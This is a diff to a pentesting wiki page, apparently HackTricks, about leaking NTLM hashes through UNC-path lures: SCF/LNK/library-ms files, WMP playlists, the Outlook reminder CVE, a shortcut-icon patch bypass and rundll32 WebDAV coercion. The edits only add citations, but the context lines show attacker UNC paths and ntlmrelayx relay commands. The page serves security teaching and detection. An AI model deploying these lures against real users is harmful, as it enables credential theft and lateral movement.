@@ -6,7 +6,7 @@
 
 ### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)
 
-If you can **write to a share that users or scheduled jobs browse in Explorer**, drop files whose metadata points to your UNC (e.g. `\\ATTACKER\share`). Rendering the folder triggers **implicit SMB authentication** and leaks a **NetNTLMv2** to your listener.
+If you can **write to a share that users or scheduled jobs browse in Explorer**, drop files whose metadata points to your UNC (e.g. `\\ATTACKER\share`). Rendering the folder triggers **implicit SMB authentication** and leaks a **NetNTLMv2** to your listener.<sup>[[1]](#references)</sup>
 
 1. **Generate lures** (covers SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
 
@@ -36,7 +36,7 @@ Windows may hit several files at once; anything Explorer previews (`BROWSE TO FO
 
 ### Windows Media Player playlists (.ASX/.WAX)
 
-If you can get a target to open or preview a Windows Media Player playlist you control, you can leak Net‑NTLMv2 by pointing the entry to a UNC path. WMP will attempt to fetch the referenced media over SMB and will authenticate implicitly.
+If you can get a target to open or preview a Windows Media Player playlist you control, you can leak Net‑NTLMv2 by pointing the entry to a UNC path. WMP will attempt to fetch the referenced media over SMB and will authenticate implicitly.<sup>[[3]](#references)</sup>
 
 Example payload:
 
@@ -62,7 +62,7 @@ hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
 
 ### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)
 
-Windows Explorer insecurely handles .library-ms files when they are opened directly from within a ZIP archive. If the library definition points to a remote UNC path (e.g., \\attacker\share), simply browsing/launching the .library-ms inside the ZIP causes Explorer to enumerate the UNC and emit NTLM authentication to the attacker. This yields a NetNTLMv2 that can be cracked offline or potentially relayed.
+Windows Explorer insecurely handles .library-ms files when they are opened directly from within a ZIP archive. If the library definition points to a remote UNC path (e.g., \\attacker\share), simply browsing/launching the .library-ms inside the ZIP causes Explorer to enumerate the UNC and emit NTLM authentication to the attacker. This yields a NetNTLMv2 that can be cracked offline or potentially relayed.<sup>[[2]](#references)</sup>
 
 Minimal .library-ms pointing to an attacker UNC
 
@@ -94,7 +94,7 @@ Operational steps
 
 ### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak
 
-Microsoft Outlook for Windows processed the extended MAPI property PidLidReminderFileParameter in calendar items. If that property points to a UNC path (e.g., \\attacker\share\alert.wav), Outlook would contact the SMB share when the reminder fires, leaking the user’s Net‑NTLMv2 without any click. This was patched on March 14, 2023, but it’s still highly relevant for legacy/untouched fleets and for historical incident response.
+Microsoft Outlook for Windows processed the extended MAPI property PidLidReminderFileParameter in calendar items. If that property points to a UNC path (e.g., \\attacker\share\alert.wav), Outlook would contact the SMB share when the reminder fires, leaking the user’s Net‑NTLMv2 without any click. This was patched on March 14, 2023, but it’s still highly relevant for legacy/untouched fleets and for historical incident response.<sup>[[5]](#references)</sup>
 
 Quick exploitation with PowerShell (Outlook COM):
 
@@ -118,7 +118,7 @@ Notes
 
 ### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)
 
-Windows Explorer renders shortcut icons automatically. Recent research showed that even after Microsoft’s April 2025 patch for UNC‑icon shortcuts, it was still possible to trigger NTLM authentication with no clicks by hosting the shortcut target on a UNC path and keeping the icon local (patch bypass assigned CVE‑2025‑50154). Merely viewing the folder causes Explorer to retrieve metadata from the remote target, emitting NTLM to the attacker SMB server.
+Windows Explorer renders shortcut icons automatically. Recent research showed that even after Microsoft’s April 2025 patch for UNC‑icon shortcuts, it was still possible to trigger NTLM authentication with no clicks by hosting the shortcut target on a UNC path and keeping the icon local (patch bypass assigned CVE‑2025‑50154). Merely viewing the folder causes Explorer to retrieve metadata from the remote target, emitting NTLM to the attacker SMB server.<sup>[[6]](#references)</sup>
 
 Minimal Internet Shortcut payload (.url):
 
@@ -154,7 +154,7 @@ Key trigger conditions (observed in `CShellLink::_LoadFromStream`):
 - Include **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) with **TargetUnicode** populated.
 - The loader expands environment variables in `TargetUnicode` and calls `PathFileExistsW` on the resulting path.
 
-If `TargetUnicode` resolves to a UNC path (e.g., `\\attacker\share\icon.ico`), **merely viewing a folder** containing the shortcut causes outbound authentication. The same load path can also be hit by **indexing** and **AV scanning**, making it a practical no‑click leak surface.
+If `TargetUnicode` resolves to a UNC path (e.g., `\\attacker\share\icon.ico`), **merely viewing a folder** containing the shortcut causes outbound authentication. The same load path can also be hit by **indexing** and **AV scanning**, making it a practical no‑click leak surface.<sup>[[7]](#references)</sup>
 
 Research tooling (parser/generator/UI) is available in the **LnkMeMaybe** project to build/inspect these structures without using the Windows GUI.
 
@@ -169,12 +169,12 @@ rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
 
 Why this is useful:
 - Against an **attacker-controlled WebDAV server**, it can trigger **NTLM over HTTP** without dropping a custom client.
-- Against **internal hosts**, it is a quiet way to **validate where stolen credentials are accepted** before moving laterally.
+- Against **internal hosts**, it is a quiet way to **validate where stolen credentials are accepted** before moving laterally.<sup>[[9]](#references)</sup>
 - The command is a good alternative when **SMB egress is filtered** but **HTTP/WebDAV** is still reachable.
 
 Operational notes:
 - The **WebClient** service must be running on the source host.
-- `rundll32.exe` loads `davclnt.dll` and makes Windows handle the WebDAV authentication using the **current user's credentials**.
+- `rundll32.exe` loads `davclnt.dll` and makes Windows handle the WebDAV authentication using the **current user's credentials**.<sup>[[10]](#references)</sup>
 - If you point it to infrastructure you control, use an NTLM-aware HTTP listener/relay such as:
 
 ```bash
@@ -182,7 +182,7 @@ Operational notes:
 ntlmrelayx.py -t smb://<TARGET> --http-port 80
 ```
 
-From a detection perspective, repeated `rundll32.exe davclnt.dll,DavSetCookie` executions against many internal systems are a strong signal of **credential validation / spray-like lateral movement prep** rather than normal user behaviour.
+From a detection perspective, repeated `rundll32.exe davclnt.dll,DavSetCookie` executions against many internal systems are a strong signal of **credential validation / spray-like lateral movement prep** rather than normal user behaviour.<sup>[[9]](#references)[[11]](#references)</sup>
 
 ### Office remote template injection (.docx/.dotm) to coerce NTLM
 
@@ -212,17 +212,17 @@ README.md
 
 
 ## References
-- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
-- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
-- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
-- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
-- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
-- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
-- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
-- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
-- [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
-- [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
-- [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
+- [1] [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
+- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
+- [3] [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
+- [4] [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
+- [5] [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
+- [6] [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
+- [7] [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
+- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
+- [9] [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
+- [10] [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
+- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
 
 
 {{#include ../../banners/hacktricks-training.md}}
